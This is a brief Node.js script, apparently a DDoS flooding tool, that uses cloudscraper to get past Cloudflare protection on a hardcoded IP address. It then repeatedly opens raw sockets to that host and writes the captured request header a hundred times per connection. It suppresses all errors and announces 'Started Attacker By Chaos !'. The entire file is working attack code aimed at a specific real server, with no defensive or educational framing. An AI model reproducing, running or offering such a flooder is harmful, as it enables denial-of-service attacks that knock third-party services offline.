const EventEmitter = require('events');
const url = require("url");
const emitter = new EventEmitter();
emitter.setMaxListeners(Number.POSITIVE_INFINITY); 
const cloudscraper = require("cloudscraper");
var int = setInterval(()=>{
var config = {url:"http://85.10.197.131",resolveWithFullResponse: true}
cloudscraper.get(config,(err,r)=>{
const s = require("net").Socket()
s.connect(80,"85.10.197.131")
s.setTimeout(10000);
for(let i=0;i<100;i++){
s.write(r['request']['req']['_header'])
}
s.on('data',()=>{
setTimeout(()=>{
s.destroy()
return delete s
},5000)
})
})
setTimeout(()=>clearInterval(int),10000)
})
console.log("Started Attacker By Chaos !")
process.on('uncaughtException', function (err) {
	console.log(err);
});

process.on('unhandledRejection', function (err) {
	console.log(err);
});
